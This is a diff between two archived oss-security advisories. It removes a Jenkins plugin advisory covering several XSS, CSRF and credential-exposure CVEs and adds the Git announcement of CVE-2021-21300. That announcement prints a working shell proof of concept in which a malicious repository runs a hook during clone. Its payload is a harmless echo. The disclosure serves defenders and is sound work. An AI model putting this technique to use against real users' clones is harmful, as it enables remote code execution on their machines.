@@ -1,129 +1,67 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/03/30/1
-Message-Id: <53E5A455-9A38-4A00-9D2C-E12BFA7EE5B0@beckweb.net>
-Date: Tue, 30 Mar 2021 12:52:09 +0200
-From: Daniel Beck <ml@...kweb.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/03/09/3
+Message-ID: <nycvar.QRO.7.76.6.2103091555260.50@gitforwindows.org>
+Date: Tue, 9 Mar 2021 16:03:37 +0100 (CET)
+From: Johannes Schindelin <Johannes.Schindelin@....de>
 To: oss-security@...ts.openwall.com
-Subject: Multiple vulnerabilities in Jenkins plugins
+cc: git-security@...glegroups.com, Matheus Tavares <matheus.bernardino@....br>
+Subject: git: malicious repositories can execute remote code while cloning
 Content-Type: text/plain; charset=utf-8
 
-Jenkins is an open source automation server which enables developers around
-the world to reliably build, test, and deploy their software.
+Team,
 
-The following releases contain fixes for security vulnerabilities:
+The Git project released new versions on Tuesday, March 9th 2021
+addressing CVE-2021-21300.
 
-* Build With Parameters Plugin 1.5.1
-* Cloud Statistics Plugin 0.27
-* Extra Columns Plugin 1.23
-* Jabber (XMPP) notifier and control Plugin 1.42
-* OWASP Dependency-Track Plugin 3.1.1
-* REST List Parameter Plugin 1.3.1
+This vulnerability affects platforms with case-insensitive filesystems
+with support for symbolic links, when certain clean/smudge filters are
+configured globally (e.g. Git LFS).
 
-Additionally, we announce unresolved security issues in the following
-plugins:
+The fixed versions are v2.17.6, v2.18.5, v2.19.6, v2.20.5, v2.21.4,
+v2.22.5, v2.23.4, v2.24.4, v2.25.5, v2.26.3, v2.27.1, v2.28.1, v2.29.3,
+and v2.30.2.
 
-* Team Foundation Server Plugin
+Link to the announcement:
+https://lore.kernel.org/git/xmqqim6019yd.fsf@gitster.c.googlers.com/T/#u
 
-Summaries of the vulnerabilities are below. More details, severity, and
-attribution can be found here:
-https://www.jenkins.io/security/advisory/2021-03-30/
+We highly recommend to upgrade.
 
-We provide advance notification for security updates on this mailing list:
-https://groups.google.com/d/forum/jenkinsci-advisories
+The addressed issue is:
 
-If you discover security vulnerabilities in Jenkins, please report them as
-described here:
-https://www.jenkins.io/security/#reporting-vulnerabilities
+* CVE-2021-21300:
+  On case-insensitive filesystems, with support for symbolic links,
+  if Git is configured globally to apply delay-capable clean/smudge
+  filters (such as Git LFS), Git could be fooled into running
+  remote code during a clone.
 
----
+  Demo exploit:
 
-SECURITY-2231 / CVE-2021-21628
-Build With Parameters Plugin 1.5 and earlier does not escape parameter
-names and descriptions.
+  #!/bin/sh
 
-This results in a stored cross-site scripting (XSS) vulnerability
-exploitable by attackers with Job/Configure permission.
+  git init delayed-checkout &&
+  (
+  	cd delayed-checkout &&
+  	echo "A/post-checkout filter=lfs diff=lfs merge=lfs" \
+  		>.gitattributes &&
+  	mkdir A &&
+  	printf '#!/bin/sh\n\necho PWNED >&2\n' >A/post-checkout &&
+  	chmod +x A/post-checkout &&
+  	>A/a &&
+  	>A/b &&
+  	git add -A &&
+  	rm -rf A &&
+  	ln -s .git/hooks a &&
+  	git add a &&
+  	git commit -m initial
+  ) &&
+  git clone delayed-checkout cloned
 
+  With Git LFS enabled globally, this will print "PWNED" during the clone
+  on case-insensitive file systems with support for symbolic links (such
+  as NTFS, HFS+, etc).
 
-SECURITY-2257 / CVE-2021-21629
-Build With Parameters Plugin 1.5 and earlier does not require POST requests
-for its form submission endpoint, resulting in a cross-site request forgery
-(CSRF) vulnerability.
+Credit for finding the vulnerability goes to Matheus Tavares who also
+worked with me on fixing it.
 
-This vulnerability allows attackers to build a project with
-attacker-specified parameters.
-
-
-SECURITY-2222 / CVE-2021-21630
-Extra Columns Plugin 1.22 and earlier does not escape parameter values in
-the build parameters column.
-
-This results in a stored cross-site scripting (XSS) vulnerability
-exploitable by attackers with Job/Configure permission. Additionally, a
-view containing such a job needs to be configured with the build parameters
-column, or the attacker also needs View/Configure permission.
-
-
-SECURITY-2246 / CVE-2021-21631
-Cloud Statistics Plugin 0.26 and earlier does not perform a permission
-check in an HTTP endpoint.
-
-This allows attackers with Overall/Read permission and knowledge of random
-activity IDs to view related provisioning exception error messages.
-
-
-SECURITY-2250 / CVE-2021-21632 (permission check) & CVE-2021-21633 (CSRF)
-OWASP Dependency-Track Plugin 3.1.0 and earlier does not perform permission
-checks in several HTTP endpoints.
-
-This allows attackers with Overall/Read permission to connect to an
-attacker-specified URL using attacker-specified credentials IDs obtained
-through another method, capturing "Secret text" credentials stored in
-Jenkins. If no credentials ID is specified, the globally configured
-credential is used, if set up, and can likewise be captured.
-
-Additionally, these HTTP endpoints do not require POST requests, resulting
-in a cross-site request forgery (CSRF) vulnerability.
-
-
-SECURITY-2162 / CVE-2021-21634
-Jabber (XMPP) notifier and control Plugin 1.41 and earlier stores passwords
-unencrypted in its global configuration file
-`hudson.plugins.jabber.im.transport.JabberPublisher.xml` on the Jenkins
-controller as part of its configuration.
-
-These passwords can be viewed by users with access to the Jenkins
-controller file system.
-
-
-SECURITY-2261 / CVE-2021-21635
-REST List Parameter Plugin 1.3.0 and earlier does not escape a parameter
-name reference in embedded JavaScript.
-
-This results in a stored cross-site scripting (XSS) vulnerability
-exploitable by attackers with Job/Configure permission.
-
-
-SECURITY-2283 (1) / CVE-2021-21636
-Team Foundation Server Plugin 5.157.1 and earlier does not perform a
-permission check in an HTTP endpoint.
-
-This allows attackers with Overall/Read permission to enumerate credentials
-IDs of credentials stored in Jenkins. Those can be used as part of an
-attack to capture the credentials using another vulnerability.
-
-As of publication of this advisory, there is no fix.
-
-
-SECURITY-2283 (2) / CVE-2021-21637 (permission check) & CVE-2021-21638 (CSRF)
-Team Foundation Server Plugin 5.157.1 and earlier does not perform a
-permission check in an HTTP endpoint.
-
-This allows attackers with Overall/Read permission to connect to an
-attacker-specified URL using attacker-specified credentials IDs obtained
-through another method, capturing credentials stored in Jenkins.
-
-Additionally, this HTTP endpoint does not require POST requests, resulting
-in a cross-site request forgery (CSRF) vulnerability.
-
-As of publication of this advisory, there is no fix.
+Thanks,
+Johannes
